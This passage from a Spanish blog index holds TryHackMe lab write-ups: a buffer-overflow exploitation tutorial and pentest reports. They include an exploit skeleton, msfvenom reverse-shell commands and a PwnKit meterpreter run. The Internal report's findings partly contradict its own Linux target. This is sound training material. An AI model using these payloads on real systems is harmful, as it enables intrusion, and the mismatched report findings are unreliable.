máquina.\nconclusiones esta máquina ha sido interesante por que me ha permitido aplicar en un entorno más realista lo aprendido en la sala de \u0026ldquo;buffer overflow prep\u0026rdquo; de tryhackme. el script que he usado es ligeramente diferente del original que guardé de la sala anterior, tuve que buscar como hacerlo ya que el chat server envía primero un mensaje de bienvenida y luego espera a recibir un mensaje para el nombre de usuario y otro para el mensaje. usando en python el comando recv(1024) se puede recibir el mensaje de bienvenida y luego enviar el nombre de usuario y el mensaje con el comando send(bytes(buffer + \u0026ldquo;\\r\\n\u0026rdquo;, \u0026ldquo;latin-1\u0026rdquo;)).\n(◕‿‿◕) hack the planet! ","title":"Brainstorm [TryHackMe]"},{"date":"2023-09-19","image":"/images/post_pics/bf/bf.png","link":"https://k3ssdev.github.io/posts/bufferoverflow_prep/","summary":"Introducción Esta sala de TryHackMe consiste en realizar una explotación de Buffer Overflow en la aplicación oscp.exe con herramientas como Immunity Debugger, Mona, y msfvenom en un entorno controlado. Es una sala de aprendizaje orientada a la preparación de ataques Buffer Overflow para la certificación OSCP, pero tambíen es un tutorial estupendo para aprender los conceptos básicos de este tipo de ataques.","tags":["Buffer Overflow","Exploit Development","Hard","Immunity Debugger","Mona","Privilege Escalation","Python","Reverse Shell","TryHackMe","Windows"],"text":"introducción esta sala de tryhackme consiste en realizar una explotación de buffer overflow en la aplicación oscp.exe con herramientas como immunity debugger, mona, y msfvenom en un entorno controlado. es una sala de aprendizaje orientada a la preparación de ataques buffer overflow para la certificación oscp, pero tambíen es un tutorial estupendo para aprender los conceptos básicos de este tipo de ataques.\n¿qué es un buffer overflow? un ataque buffer overflow es un error de programación que sucede cuando se copian una cantidad de datos en un área de memoria que no es suficientemente grande para almacenarlos. esto causaría un desbordamiento de buffer o buffer overrun, lo cual hace que los datos de entrada ocupen zonas de memoria adyacentes, donde un atacante podría ejecutar un código malicioso.\nun desbordamiento de búfer (buffer overflow) es una vulnerabilidad de seguridad que ocurre cuando un programa o aplicación intenta almacenar más datos en un búfer (una región de memoria temporal) de lo que puede contener. esto puede llevar a que los datos sobrantes sobrescriban la memoria adyacente, incluyendo áreas críticas del programa o incluso el sistema operativo, lo que puede tener consecuencias graves.\n¿para que se puede usar el buffer overflow? un ataque de buffer overflow puede tener diferentes objetivos\ndenegación de servicio del software objetivo. sobreescribir la eip para ejecutar código arbitrario dentro del sistema. registros de cpu en un ataque de desbordamiento de búfer (buffer overflow), los registros de la cpu pueden ser fundamentales tanto para el éxito del ataque como para el control posterior sobre el programa o sistema. los registros más importantes en este contexto son:\neip (extended instruction pointer): es el registro que indica la dirección de memoria de la próxima instrucción que se ejecutará. en un ataque de desbordamiento de búfer, los atacantes suelen tratar de sobrescribir el valor de eip para redirigir la ejecución del programa a una ubicación controlada por ellos, donde pueden inyectar código malicioso. esp (stack pointer): es el registro que apunta a la cima de la pila de llamadas (stack) en memoria. durante un ataque de desbordamiento de búfer, los atacantes pueden manipular el valor de esp para controlar la ubicación en la que se almacenan los datos en la pila, lo que les permite modificar el flujo de ejecución. ebp (base pointer): se utiliza como un punto de referencia en la pila para acceder a variables locales y parámetros de función. los atacantes también pueden intentar modificar el ebp para manipular la ejecución del programa. otros registros generales: los registros generales como eax, ebx, ecx, y edx también pueden ser utilizados en ataques de desbordamiento de búfer, ya que pueden contener datos que los atacantes intentan sobrescribir o manipular para lograr sus objetivos. ¿cómo se hace un buffer overflow? el proceso se puede resumir en los 4 pasos siguientes:\neip offset (desplazamiento de eip): en el proceso de explotación, uno de los pasos importantes es determinar cuántos bytes se necesitan para sobrescribir el registro eip (extended instruction pointer). esto se hace enviando una secuencia de bytes de prueba y observando en qué punto se sobrescribe eip. el valor en bytes desde el inicio de la secuencia hasta donde se sobrescribe eip es el \u0026ldquo;eip offset\u0026rdquo;. debes encontrar este valor mediante el fuzzing antes de continuar con la explotación. badchars (caracteres no válidos): los \u0026ldquo;badchars\u0026rdquo; son bytes que pueden causar problemas en la explotación, como corromper la carga útil o impedir la ejecución del código malicioso. en este caso, se te pide que identifiques los \u0026ldquo;badchars\u0026rdquo; enviando una secuencia de bytes y comparando lo que se envió con lo que llegó a la memoria del programa objetivo. los caracteres \u0026ldquo;badchars\u0026rdquo; son aquellos que se comportan de manera inesperada o dañina. encontrar un punto de salto (jump point): una vez que tengas el \u0026ldquo;eip offset\u0026rdquo; y hayas identificado los \u0026ldquo;badchars\u0026rdquo;, debes encontrar una instrucción de salto (por ejemplo, jmp esp) en el código del programa que no contenga \u0026ldquo;badchars\u0026rdquo;. esta instrucción de salto se usará para redirigir la ejecución del programa a la carga útil maliciosa. generar la carga útil (payload): una vez que tengas todos los elementos anteriores, debes generar una carga útil que se inyectará en el programa objetivo para lograr tu objetivo. la carga útil suele ser código malicioso que te proporciona acceso al sistema objetivo o realiza alguna acción específica. exploit: finalmente, ejecutas el exploit modificando el programa objetivo con la carga útil y aprovechando la vulnerabilidad de desbordamiento de búfer para obtener acceso o control sobre el sistema. buffer overflow prep oscp explotando un buffer overflow de 64 bits saltando al shellcode explicación de buffer overflow desarrollo de exploits en windows - parte 4: localización de saltos al shellcode una visión práctica de buffer overflow basado en la pila apuntes adaptados de: https://github.com/tib3rius/pentest-cheatsheets/blob/master/exploits/buffer-overflows.rst\nimmunity debugger siempre ejecuta immunity debugger como administrador si es posible.\ngeneralmente, hay dos formas de usar immunity debugger para depurar una aplicación:\nasegúrate de que la aplicación esté en ejecución, abre immunity debugger y luego usa archivo -\u0026gt; adjuntar para conectar el depurador al proceso en ejecución. abre immunity debugger y luego usa archivo -\u0026gt; abrir para ejecutar la aplicación. cuando adjuntas una aplicación o abres una aplicación en immunity debugger, la aplicación se pausará. haz clic en el botón \u0026ldquo;ejecutar\u0026rdquo; o presiona f9.\nnota: si el binario que estás depurando es un servicio de windows, es posible que necesites reiniciar la aplicación mediante sc.\nsc stop slmail sc start slmail algunas aplicaciones están configuradas para iniciarse desde el administrador de servicios y no funcionarán a menos que se inicien desde el control de servicios.\nconfiguración de mona mona es un complemento para immunity debugger que facilita mucho la explotación de buffer overflows. descarga: mona.py\nla última versión se puede descargar aquí: https://github.com/corelan/mona el manual se encuentra aquí: https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/ copiar el archivo mona.py en el directorio pycommands de immunity debugger (generalmente ubicado en c:\\program files\\immunity inc\\immunity debugger\\pycommands).\nen immunity debugger, ejecutar el siguiente comando para configurar un directorio de trabajo para mona.\n!mona config -set workingfolder c:\\mona\\%p fuzzing el siguiente script de python se puede modificar y usar para fuzzear puntos de entrada remotos de una aplicación. enviará cadenas de búfer cada vez más largas con la esperanza de que una de ellas finalmente haga que la aplicación se bloquee.\n#!/usr/bin/env python3 import socket, time, sys ip = \u0026#34;ip_target\u0026#34; port = 1337 timeout = 5 prefix = \u0026#34;overflow1 \u0026#34; string = prefix + \u0026#34;a\u0026#34; * 100 while true: try: with socket.socket(socket.af_inet, socket.sock_stream) as s: s.settimeout(timeout) s.connect((ip, port)) s.recv(1024) print(\u0026#34;fuzzing with {} bytes\u0026#34;.format(len(string) - len(prefix))) s.send(bytes(string, \u0026#34;latin-1\u0026#34;)) s.recv(1024) except: print(\u0026#34;fuzzing crashed at {} bytes\u0026#34;.format(len(string) - len(prefix))) sys.exit(0) string += 100 * \u0026#34;a\u0026#34; time.sleep(1) asegurarse de que el registro eip haya sido sobrescrito por a (\\x41). hay que tomar nota de cualquier otro registro que haya sido sobrescrito o que esté apuntando a un espacio en memoria que ha sido sobrescrito.\nreplicación del bloqueo y control de eip el siguiente código de exploit esqueleto se puede usar para el resto de la explotación de buffer overflow:\nimport socket ip = \u0026#34;ip_target\u0026#34; port = 1337 prefix = \u0026#34;overflow1 \u0026#34; offset = 0 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;\u0026#34; padding = \u0026#34;\u0026#34; payload = \u0026#34;\u0026#34; postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.af_inet, socket.sock_stream) try: s.connect((ip, port)) print(\u0026#34;sending evil buffer...\u0026#34;) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) print(\u0026#34;done!\u0026#34;) except: print(\u0026#34;could not connect.\u0026#34;) usando la longitud del búfer que causó el bloqueo, generar un búfer único para determinar el desplazamiento en el patrón que sobrescribe el registro eip y el desplazamiento en el patrón al que apuntan otros registros. crea un patrón que sea 400 bytes más largo que el búfer que bloqueó la aplicación para determinar si nuestro shellcode puede encajar de inmediato. si el búfer más grande no bloquea la aplicación, usa un patrón igual a la longitud del búfer que bloqueó la aplicación y agrega lentamente más al búfer para encontrar espacio.\nmsf-pattern_create -l 600 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag mientras el búfer único esté en la pila, usa el comando findmsp de mona o la herramienta en linux msf-pattern_offset, con el argumento de distancia configurado en la longitud del patrón.\n# con msf-pattern, donde -q es el adress y -l la longitud msf-pattern_offset -q 35714234 -l 600 # con mona en inmunity debugger, los dos metodos son validos !mona findmsp -distance 600 ... [+] buscando un patrón cíclico en la memoria patrón cíclico (normal) encontrado en 0x005f3614 (longitud 600 bytes) patrón cíclico (normal) encontrado en 0x005f4a40 (longitud 600 bytes) patrón cíclico (normal) encontrado en 0x017df764 (longitud 600 bytes) eip contiene un patrón normal: 0x78413778 (desplazamiento 112) esp (0x017dfa30) apunta al desplazamiento 116 en el patrón normal (longitud 484) eax (0x017df764) apunta al desplazamiento 0 en el patrón normal (longitud 600) ebp contiene un patrón normal: 0x41367841 (desplazamiento 108) ... tomar nota del desplazamiento de eip y de cualquier otro registro que apunte al patrón, tomando nota de sus desplazamientos también. parece que el registro esp apunta a los últimos 484 bytes del patrón, que es suficiente espacio para nuestro shellcode.\ncrea un nuevo búfer utilizando esta información para asegurarte de que puedas controlar eip:\nprefix = \u0026#34;\u0026#34; offset = 112 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;bbbb\u0026#34; padding = \u0026#34;\u0026#34; payload = \u0026#34;c\u0026#34; * (600-112-4) postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix bloquea la aplicación usando este búfer y asegúrate de que eip esté sobrescrito por b (\\x42) y que el registro esp apunte al comienzo de los c enviados en el payload.\nencontrar caracteres incorrectos genera un bytearray utilizando mona y excluye el byte nulo (\\x00) de forma predeterminada. toma nota de la ubicación del archivo bytearray.bin que se genera.\n!mona bytearray -b \u0026#34;\\x00\u0026#34; ahora genera una cadena de caracteres incorrectos que sea idéntica al bytearray. el siguiente script de python se puede utilizar para generar una cadena de caracteres incorrectos desde \\x01 hasta \\xff:\n#!/usr/bin/env python from __future__ import print_function for x in range(1, 256): print(\u0026#34;\\\\x\u0026#34; + \u0026#34;{:02x}\u0026#34;.format(x), end=\u0026#39;\u0026#39;) print() coloca la cadena de caracteres incorrectos antes de los c en tu búfer y ajusta la cantidad de c para compensar:\nbadcharacters = \u0026#34;\\x01\\x02\\x03\\x04\\x05...\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; payload = badcharacters + \u0026#34;c\u0026#34; * (600-112-4-255) bloquea la aplicación usando este búfer y toma nota de la dirección a la que apunta esp. esto puede cambiar cada vez que bloquees la aplicación, así que acostúmbrate a copiarlo del registro cada vez.\nutiliza el comando mona compare para hacer referencia al bytearray que generaste y a la dirección a la que apunta esp:\n# comparar con el address !mona compare -f c:\\mona\\\u0026lt;appname\u0026gt;\\bytearray.bin -a \u0026lt;dirección\u0026gt; # comparar referenciando al address con esp !mona compare -f c:\\mona\\\u0026lt;appname\u0026gt;\\bytearray.bin -a esp repetir hasta que haya encontrado todos los badcharacters, haciendolo de uno en uno.\nencontrar un punto de salto el comando mona jmp se puede usar para buscar instrucciones jmp (o equivalentes) a un registro específico. el comando jmp, por defecto, ignorará cualquier módulo marcado como aslr o rebase.\nel siguiente ejemplo busca \u0026ldquo;jmp esp\u0026rdquo; o equivalente (por ejemplo, call esp, push esp; retn, etc.) asegurándose de que la dirección de la instrucción no contenga los caracteres incorrectos \\x00, \\x0a y \\x0d.\n!mona jmp -r esp -cpb \u0026#34;\\x00\\x0a\\x0d\u0026#34; el comando mona find también se puede utilizar para encontrar instrucciones específicas, aunque en su mayor parte, el comando jmp es suficiente:\n!mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x0a\\x0d\u0026#34; cuando se encuentr el punto de salto, hay que anotar cualquiera de las direcciones que genere el comando de mona. las direcciones de memoria generalmente se almacenan en formato hexadecimal y en un formato específico de bytes en aplicaciones de explotación.\nsi la dirección que obtuviste de mona está en formato hexadecimal, generalmente se necesita convertirla en el formato necesario para que la aplicación la ejecute correctamente. en este caso se hará con el formato little endian.\nlittle endian: en este formato, el byte menos significativo (el byte más pequeño) se almacena en la dirección de memoria más baja, mientras que el byte más significativo (el byte más grande) se almacena en la dirección de memoria más alta. la mayoría de las arquitecturas x86 y x86-64 utilizan el formato little endian.\nsupongamos que tenemos el número hexadecimal 0x12345678. dirección de memoria más baja (menos significativa): 0x78 dirección de memoria siguiente: 0x56 dirección de memoria siguiente: 0x34 dirección de memoria más alta (más significativa): 0x12 por lo que quedaría \\x78\\x56\\x34\\x12 se puede hacer a mano o usando el pequeño script de python siguiente:\nimport sys if len(sys.argv) != 2: print(\u0026#34;[*] run:\\n\\tjump_address.py \u0026lt;jump_point_address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] n1 = address[0:2] n2 = address[2:4] n3 = address[4:6] n4 = address[6:8] print(\u0026#34;\\nretn = \u0026#34; + \u0026#34;\\\u0026#34;\\\\x\u0026#34; + n4 + \u0026#34;\\\\x\u0026#34; + n3 +\u0026#34;\\\\x\u0026#34; + n2 +\u0026#34;\\\\x\u0026#34; + n1+\u0026#34;\\\u0026#34;\u0026#34;) generar payload genera un payload de shell inverso usando msfvenom, asegurándote de excluir los mismos caracteres incorrectos que se encontraron anteriormente:\n# reverse shell basica msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.92 lport=4444 exitfunc=thread -b \u0026#34;\\x00\\x0a\\x0d\u0026#34; -f c # meterpreter msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 exitfunc=process -b \u0026#34;\\x00\\x0a\\x0d\u0026#34; -f c agregar nops si se utilizó un codificador (lo más probable si hay caracteres incorrectos), recuerda agregar al menos 16 nops (\\x90) al payload.\nbúfer final prefix = \u0026#34;\u0026#34; offset = 112 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;\\x56\\x23\\x43\\x9a\u0026#34; padding = \u0026#34;\\x90\u0026#34; * 16 payload = \u0026#34;\\xdb\\xde\\\\xba\\x69\\xd7\\xe9\\xa8\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1...\u0026#34; postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix seguir practicando buffer overflow dostackbufferoverflowgood vulnserver práctica de stack buffer overflow pwk/oscp (◕‿‿◕) hack the planet! ","title":"Buffer Overflow Prep [TryHackMe]"},{"date":"2023-09-12","image":"/images/post_pics/internal/internal.jpeg","link":"https://k3ssdev.github.io/posts/internal/","summary":"Introducción Esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a la máquina y escalar privilegios. Es de dificultad Media, y salvo unas instrucciones iniciales, no hay pistas.","tags":["EternalBlue","GoBuster","Hard","Metasploit","MS17-010","pkexec","Privilege Escalation","Report","Simulation","TryHackMe","Windows","Wordpress","wpscan"],"text":"introducción esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. el objetivo es obtener acceso a la máquina y escalar privilegios. es de dificultad media, y salvo unas instrucciones iniciales, no hay pistas. la idea de esta sala es poner en práctica los conocimientos adquiridos en otras salas, partiendo de las instrucciones de un supuesto cliente y elaborando un informe de los pasos seguidos y las conclusiones obtenidas.\ninforme de prueba de penetración has sido asignado a un cliente que desea realizar una prueba de penetración en un entorno que está programado para ser lanzado a producción en tres semanas.\nalcance del trabajo\nel cliente solicita que un ingeniero realice una evaluación externa, de aplicaciones web e interna del entorno virtual proporcionado. el cliente ha pedido que se proporcione la menor cantidad de información posible sobre la evaluación, deseando que la participación se lleve a cabo desde la perspectiva de un actor malicioso (prueba de penetración de caja negra). el cliente ha pedido que se aseguren dos banderas (sin ubicación proporcionada) como prueba de explotación:\nuser.txt root.txt además, el cliente ha proporcionado las siguientes autorizaciones dentro del alcance:\nasegurarse de que modifiques tu archivo hosts para reflejar internal.thm. se permiten todas las herramientas o técnicas en este ejercicio. localizar y tomar nota de todas las vulnerabilidades encontradas. enviar las banderas descubiertas al panel de control comandos utilizados y resultados a continuación se detallan los comandos utilizados y los resultados obtenidos durante la prueba de penetración:\ncomando: modificación del archivo hosts para apuntar al servidor web interno\nsudo nano /etc/hosts resultado de modificación del archivo hosts:\n# archivo hosts ... 10.10.13.3 internal.thm ... comando: escaneo de puertos con nmap\nsudo nmap -p22,80 -sc -sv -pn -on nmap_final 10.10.13.3 resultado del escaneo de puertos con nmap:\n# nmap 7.94 scan initiated thu sep 14 19:07:50 2023 as: nmap -p22,80 -sc -sv -pn -on nmap_final 10.10.13.3 nmap scan report for 10.10.13.3 host is up (0.052s latency). port state service version 22/tcp open ssh openssh 7.6p1 ubuntu 4ubuntu0.3 (ubuntu linux; protocol 2.0) 80/tcp open http apache httpd 2.4.29 ((ubuntu)) ... comando: búsqueda de subdominios con dirb\ndirb http://internal.thm/ resultado de la búsqueda de subdominios con dirb:\ndirb v2.22 by the dark raver start_time: thu sep 14 19:16:04 2023 url_base: \u0026lt;http://internal.thm/\u0026gt; wordlist_files: /usr/share/dirb/wordlists/common.txt ... ==\u0026gt; directory: \u0026lt;http://internal.thm/blog/\u0026gt; comando: uso de wpscan para escanear wordpress\nwpscan --url \u0026lt;http://internal.thm/blog/\u0026gt; | tee wordpress_scan.txt resultado del escaneo de wordpress con wpscan:\nwordpress security scanner by the wpscan team version 3.8.24 sponsored by automattic - \u0026lt;https://automattic.com/\u0026gt; ... [+] url: \u0026lt;http://internal.thm/blog/\u0026gt; [10.10.13.3] [+] started: thu sep 14 19:18:30 2023 interesting finding(s): [+] headers | interesting entry: server: apache/2.4.29 (ubuntu) ... [+] wordpress version 5.4.2 identified (insecure, released on 2020-06-10). [+] wordpress theme in use: twentyseventeen ... acceso a wordpress con credenciales\n# después de obtener las credenciales, se accede a wordpress modificación de la plantilla de tema en wordpress\n# modificación de 404.php con una reverse shell php y configuración de un listener. resultado del acceso a la reverse shell y elevación de privilegios:\n$ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@internal:/$ whoami www-data $ cd /home/aubreanna/ $ cat user.txt thm{int3rna1_fl4g_1} $ cat jenkins.txt internal jenkins service is running on 172.17.0.2:8080 $ cd /root $ cat root.txt thm{d0ck3r_d3str0y3r} comando: uso del local exploit suggester\nuse post/multi/recon/local_exploit_suggester resultado del uso del local exploit suggester:\n# [*] 10.10.13.3 - collecting local exploits for x86/linux... [*] 10.10.13.3 - 186 exploit checks are being tried... [+] 10.10.13.3 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: the target is vulnerable. [+] 10.10.13.3 - exploit/linux/local/nested_namespace_idmap_limit_priv_esc: the target appears to be vulnerable. [+] 10.10.13.3 - exploit/linux/local/pkexec: the service is running, but could not be validated. [+] 10.10.13.3 - exploit/linux/local/su_login: the target appears to be vulnerable. [+] 10.10.13.3 - exploit/linux/local/sudoedit_bypass_priv_esc: the target appears to be vulnerable. sudo 1.8.21p2.pre.3ubuntu1.2 is vulnerable, but unable to determine editable file. os can not be exploited by this module [*] running check method for exploit 58 / 58 [*] 10.10.13.3 - valid modules for session 5: # name potentially vulnerable? check result --- 1 exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec yes the target is vulnerable. 2 exploit/linux/local/nested_namespace_idmap_limit_priv_esc yes the target appears to be vulnerable. 3 exploit/linux/local/pkexec yes the service is running, but could not be validated. 4 exploit/linux/local/su_login yes the target appears to be vulnerable. 5 exploit/linux/local/sudoedit_bypass_priv_esc yes the target appears to be vulnerable. sudo 1.8.21p2.pre.3ubuntu1.2 is vulnerable, but unable to determine editable file. os can not be exploited by this module uso de un exploit para escalar privilegios\nuse exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec resultado del uso del exploit para escalar privilegios:\n[*] no payload configured, defaulting to linux/x64/meterpreter/reverse_tcp ... [*] started reverse tcp handler on 10.x.x.x:4444 [*] running automatic check (\u0026#34;set autocheck false\u0026#34; to disable) [!] verify cleanup of /tmp/.ihwjusr [+] the target is vulnerable. [*] writing \u0026#39;/tmp/.mfdetzh/hqwcgjkyyn/hqwcgjkyyn.so\u0026#39; (548 bytes) ... [!] verify cleanup of /tmp/.mfdetzh [*] sending stage (3045380 bytes) to 10.10.13.3 [+] deleted /tmp/.mfdetzh/hqwcgjkyyn/hqwcgjkyyn.so [+] deleted /tmp/.mfdetzh/.xtbfsbd [+] deleted /tmp/.mfdetzh [*] meterpreter session 6 opened (10.14.50. 184:4444 -\u0026gt; 10.10.13.3:58502) at 2023-09-14 19:33:24 +0000 meterpreter \u0026gt; shell process 1323 created. channel 0 created. whoami root cat /root/root.txt thm{d0ck3r_d3str0y3r vulnerabilidades vulnerabilidad 1 descripción: riesgo de escalada de privilegios debido a problemas en el servicio pkexec.\nmitigación: para mitigar esta vulnerabilidad, se recomienda actualizar el sistema operativo y el software relacionado a sus últimas versiones. esto asegurará que las correcciones de seguridad más recientes estén en su lugar. además, es fundamental revisar y ajustar los permisos y configuraciones de seguridad relacionadas con el servicio pkexec. limitar el acceso y los privilegios de los usuarios a lo estrictamente necesario reducirá el riesgo de escalada de privilegios en el futuro.\nvulnerabilidad 2 descripción: la falta de actualizaciones de sistemas y software expone la infraestructura a amenazas conocidas que podrían ser explotadas por atacantes.\nmitigación: la mitigación implica la implementación de un proceso de actualización regular tanto para el sistema operativo como para las aplicaciones y servicios utilizados en el entorno. esto asegurará que todas las vulnerabilidades conocidas estén parcheadas. además, es esencial configurar permisos y políticas de seguridad adecuadamente para limitar el acceso y la exposición a riesgos. también, se recomienda implementar una política de seguridad de aplicaciones web sólida que incluya auditorías y pruebas de penetración regulares para identificar y remediar problemas de seguridad.\nvulnerabilidad 3 descripción: riesgo en la seguridad del servidor smb que podría exponer recursos compartidos..\nmitigación: para abordar esta vulnerabilidad, se deben tomar medidas para restringir el acceso a los recursos compartidos solo a usuarios autorizados. el control de acceso basado en roles (rbac) puede ayudar a limitar quién puede cargar y ejecutar archivos en los recursos compartidos. además, se debe establecer un sistema de monitoreo y auditoría que permita detectar actividades sospechosas y tomar medidas preventivas de inmediato.\nvulnerabilidad 4 descripción: los usuarios y grupos tienen privilegios mal asignados, lo que puede ser explotado por atacantes para obtener acceso no autorizado a recursos y funciones sensibles del sistema.\nmitigación: la mitigación de esta vulnerabilidad comienza con una evaluación completa de los privilegios asignados a los usuarios y grupos. los privilegios sensibles, como \u0026ldquo;seimpersonate\u0026rdquo;, deben estar restringidos a usuarios y aplicaciones específicos que los necesiten. la implementación de políticas de seguridad y auditoría es fundamental para registrar y supervisar el uso de estos privilegios, lo que permite detectar y responder a actividades sospechosas.\nvulnerabilidad 5 descripción: la configuración incorrecta del servidor web expone rutas que devuelven códigos de respuesta 400, lo que podría ser utilizado por atacantes para identificar vulnerabilidades.\nmitigación: para mitigar esta vulnerabilidad, es necesario revisar y corregir la configuración del servidor web para eliminar las rutas que devuelven códigos de respuesta 400. también se pueden implementar listas de control de acceso (acl) para limitar el acceso a recursos no deseados. el uso de un firewall de aplicaciones web (waf) puede ser beneficioso para detectar y bloquear solicitudes maliciosas antes de que lleguen al servidor web.\nvulnerabilidad 6 descripción: riesgo de explotación debido a la vulnerabilidad ms17-010.\nmitigación: la mitigación principal para esta vulnerabilidad implica la aplicación inmediata de los parches de seguridad disponibles para cerrar la vulnerabilidad ms17-010. además, se recomienda utilizar un sistema de detección de intrusiones (ids) o prevención de intrusiones (ips) para detectar y bloquear intentos de explotación de esta vulnerabilidad. la segmentación de la red también es esencial para limitar la propagación de malware en caso de una explotación exitosa en un segmento de red.\nconclusiones la prueba de penetración identificó vulnerabilidades críticas y altas en el entorno del cliente, lo que podría haber resultado en un compromiso significativo de la seguridad. la explotación exitosa de vulnerabilidades resalta la importancia de mantener actualizados los sistemas y configurar adecuadamente los permisos. además, se encontraron rutas web mal configuradas que pueden ser un vector de ataque potencial.\nrecomendaciones finales aplicar actualizaciones de seguridad de manera regular. configurar permisos y políticas de seguridad adecuadamente. implementar una política de seguridad de aplicaciones web sólida. realizar auditorías de seguridad y pruebas de penetración periódicas. seguir las mejores prácticas de seguridad de la industria. (◕‿‿◕) hack the planet! ","title":"Internal, Penetration Testing Challenge [TryHackMe]"},{"date":"2023-09-09","image":"/images/post_pics/relevant/relevant.jpeg","link":"https://k3ssdev.github.io/posts/relevant/","summary":"Introducción Esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a la máquina y escalar privilegios. Es de dificultad Media, y salvo unas instrucciones iniciales, no hay pistas.","tags":["EternalBlue","GoBuster","Medium","Metasploit","MS17-010","PrintSpoofer","Privilege Escalation","Report","Simulation","TryHackMe","Windows"],"text":"introducción esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. el objetivo es obtener acceso a la máquina y escalar privilegios. es de dificultad media, y salvo unas instrucciones iniciales, no hay pistas. la idea de esta sala es poner en práctica los conocimientos adquiridos en otras salas, partiendo de las instrucciones de un supuesto cliente y elaborando un informe de los pasos seguidos y las conclusiones obtenidas.\ninforme de prueba de penetración alcance del trabajo este informe detalla los resultados de una prueba de penetración realizada en un entorno virtual con la dirección ip 10.x.x.x. el objetivo principal fue evaluar la seguridad del sistema y su resistencia a posibles amenazas cibernéticas. la evaluación se llevó a cabo desde la perspectiva de un actor malicioso en un escenario de prueba de penetración de caja negra.\nel cliente ha solicitado la obtención de dos banderas como prueba de explotación:\nuser.txt root.txt el alcance permitió el uso de cualquier herramienta o técnica, con una preferencia por la explotación manual. se requirió la identificación y documentación de todas las vulnerabilidades encontradas. solo la dirección ip asignada a la máquina del evaluador estuvo dentro del alcance. además, se destacó que existían múltiples rutas para obtener privilegios de root.\nevaluación de vulnerabilidades y explotación vulnerabilidad 1 descripción: durante la fase de enumeración, se identificaron múltiples puertos abiertos en el sistema, incluyendo el puerto 80 (http), el puerto 135 (msrpc), el puerto 139 (netbios-ssn), el puerto 445 (microsoft-ds), el puerto 3389 (ms-wbt-server) y los puertos 49663, 49666 y 49668 de estado desconocido.\ngravedad: información inicial\nevidencia: resultados del escaneo nmap.\n# escaneo inicial sudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial \u0026#34;$ip_address\u0026#34; # nmap 7.94 scan initiated fri sep 8 19:19:59 2023 as: nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.x.x.x nmap scan report for 10.10.44.97 host is up (0.054s latency). not shown: 65527 filtered tcp ports (no-response) port state service 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49663/tcp open unknown 49666/tcp open unknown 49668/tcp open unknown read data files from: /usr/bin/../share/nmap # nmap done at fri sep 8 19:20:38 2023 -- 1 ip address (1 host up) scanned in 39.48 seconds # procesar la salida del primer escaneo y extraer puertos ports=$(cat nmap_inicial | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f1 | xargs | tr \u0026#39; \u0026#39; \u0026#39;,\u0026#39;) # escaneo final utilizando los puertos extraídos sudo nmap -p\u0026#34;$ports\u0026#34; -sc -sv -pn -on nmap_final \u0026#34;$ip_address\u0026#34; # nmap 7.94 scan initiated fri sep 8 19:21:13 2023 as: nmap -p80,135,139,445,3389,49663,49666,49668 -sc -sv -pn -on nmap_final 10.x.x.x nmap scan report for 10.x.x.x host is up (0.038s latency). port state service version 80/tcp open http microsoft iis httpd 10.0 |_http-server-header: microsoft-iis/10.0 |_http-title: iis windows server | http-methods: |_ potentially risky methods: trace 135/tcp open msrpc microsoft windows rpc 139/tcp open netbios-ssn microsoft windows netbios-ssn 445/tcp open ²9ýu windows server 2016 standard evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server microsoft terminal services | ssl-cert: subject: commonname=relevant | not valid before: 2023-09-07t17:15:27 |_not valid after: 2024-03-08t17:15:27 |_ssl-date: 2023-09-08t17:22:39+00:00; -22s from scanner time. | rdp-ntlm-info: | target_name: relevant | netbios_domain_name: relevant | netbios_computer_name: relevant | dns_domain_name: relevant | dns_computer_name: relevant | product_version: 10.0.14393 |_ system_time: 2023-09-08t17:22:00+00:00 49663/tcp open http microsoft iis httpd 10.0 | http-methods: |_ potentially risky methods: trace |_http-title: iis windows server |_http-server-header: microsoft-iis/10.0 49666/tcp open msrpc microsoft windows rpc 49668/tcp open msrpc microsoft windows rpc service info: oss: windows, windows server 2008 r2 - 2012; cpe: cpe:/o:microsoft:windows host script results: | smb-os-discovery: | os: windows server 2016 standard evaluation 14393 (windows server 2016 standard evaluation 6.3) | computer name: relevant | netbios computer name: relevant\\x00 | workgroup: workgroup\\x00 |_ system time: 2023-09-08t10:22:04-07:00 | smb-security-mode: | account_used: 